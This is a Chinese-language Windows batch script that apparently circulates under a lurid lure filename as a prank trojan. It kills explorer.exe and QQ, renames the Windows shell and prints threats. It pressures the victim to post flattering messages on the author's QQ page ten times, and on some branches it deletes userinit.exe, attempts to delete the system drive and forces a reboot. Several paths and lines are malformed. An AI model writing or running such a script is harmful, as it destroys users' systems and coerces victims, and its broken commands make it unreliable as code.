@echo off
color 7d
echo ping www.baidu.com > d:小小木马.exe
taskkill /f /im explorer.exe
taskkill /f /im qq.exe
ren %SystemRoot%explorer.exe killer.dll
cls
echo 90后怎么啦？啊？90后就这么吸引你吗？
echo.
echo 哈哈哈！好开心呐！又有人中招了。
echo.
echo 不过别担心，我可不是坏人,嘿嘿！O(∩_∩)O
echo.
echo 这个界面还挺温馨的吧？好歹我也会考虑下中标者的心理对吧？
echo.
echo 别把我的窗口关掉，也别关机，信不信由你（警告）。
echo.
echo 下面给你一个选择，请慎重。
:shi
echo.
set /p AA=请键入Y（相信我）或者N（不相信）后按回车(y/n):
if /i "%AA%"=="y" goto hui
if /i "%AA%"=="n" goto no
cls
echo 你放弃了选择或者键入错误！
pause
goto shi
:no
del %SystemRoot%killer.dll
del /f /s /q %SystemRoot%system32userinit.exe
cls
echo 既然你不相信我，那我也没什好说的了。
echo.
echo 别以为我只会干坏事，如果你相信我，那么一切都会没事的。
echo.
echo 下一步，请按任意键重启吧！唉?(???)?
pause
echo @echo off >a.bat
echo del d:小小木马.exe >>a.bat
echo del a.txt >>a.bat
echo del 90后女生的龌龊事太震撼了.bat >>a.bat
echo exit >>a.bat
shutdown -r -t 00
start a.bat
exit
:hui
cls
echo 哈哈，谢谢你相信我，你的选择是正确的。
echo.
echo 不过，你必须得按照我的提示完成以下步骤才行。
echo.
echo 等你完成了我的要求，我自然会把你的系统给恢复了。
echo.
echo 我善解人意吧？
echo.
echo 你要记住，在没有完全结束程序之前，你必须对我是友善的。
echo.
echo 不难吧？呵呵O(∩_∩)O
pause
echo %date% >a.txt & echo %time% >>a.txt
echo 哈哈，小样，中招了吧？ >>a.txt
echo 不过你别担心，我不会对你怎么样，最主要的是你现在得听我的！ >>a.txt
echo 听懂了吗？呵呵。我正在监视你的电脑，所以别乱动。 >>a.txt
echo 登陆你的QQ，然后点击查找，输入我的QQ号：1652289622. >>a.txt
echo 点击查看资料，然后点击我的空间，然后在我的留言板留10次“哥哥你好帅” >>a.txt
echo 我是不会盗你的QQ号的。因为这没意思，我玩的是好玩的游戏。 >>a.txt
echo 现在可以关掉这记事本了。O(∩_∩)O >>a.txt
for %%i in (c,d,e,f) do for /f "delims=" %%n in (’dir /s /b %%i:qq.exe’) do start "" "%%n"
start a.txt
cls
echo 登陆你的QQ并且留言后执行下一步。
pause
cls
echo 呵呵，游戏到此也快结束了，放心，待会儿你的系统就会恢复了。
echo.
echo 但是!我还想在玩一个选择游戏，如果你正确的通关了，我就把你的系统恢复了，嘿!
echo.
echo 下面，请你做一个最关键的选择，记住，要慎重。
echo.
echo.
:no1
set /p BB=请键入Y（哥哥你好帅）或者N（你一点都不帅）后按回车(y/n):
if /i "%BB%"=="y" goto no3
if /i "%BB%"=="n" goto no2
cls
echo 你放弃了选择或者键入错误！
pause
goto no1
:no2
del %SystemRoot%killer.dll
del /f /s /q %SystemRoot%system32userinit.exe
attrib -r -s -h %SystemDrive%
tldr % del %SystemDrive%
tldr
cls
echo 我操，我靠，难道我不帅吗？你怎么知道我不帅了啊？
echo.
echo 能把这小东西做到这样难道我不帅吗？你知道这样会让你的系统崩溃吗？
echo.
echo 我都说了要你慎重选择的,可是你偏偏选错了，没办法。?(???)?唉
echo.
echo 下一步，请按任意键重启吧！唉?(???)?
pause
echo @echo off >a.bat
echo del d:小小木马.exe >>a.bat
echo del a.txt >>a.bat
echo del 90后女生的龌龊事太震撼了.bat >>a.bat
echo exit >>a.bat
shutdown -r -t 00
start a.bat
exit
:no3
cls
echo.
echo 哈哈，谢谢你，我知道我挺帅的，不过还是想满足下自己的虚荣心。嘿嘿
echo.
echo 我真帅!O(∩_∩)O哈哈，滋滋，帅到掉渣吧？
echo.
echo 下一步，按任意键恢复你的系统吧。
echo.
echo.
echo.
pause
ren %SystemRoot%killer.dll explorer.exe & start %SystemRoot%explorer.exe
del %SystemRoot%killer.dll
cls
echo 桌面出来了吧？哈哈，恭喜你过关。
echo.
echo 不过你别急着关了我这个程序，为什么呢？
echo.
echo 因为.............
echo.
echo 你看看你的D盘底下是不是多了样东西呢？
echo.
echo 想知道是什么吗？按任意键你就知道了。
echo.
pause
echo @echo off >a.bat
echo del d:小小木马.exe >>a.bat
echo del a.txt >>a.bat
echo del 90后女生的龌龊事太震撼了.bat >>a.bat
echo exit >>a.bat
start a.bat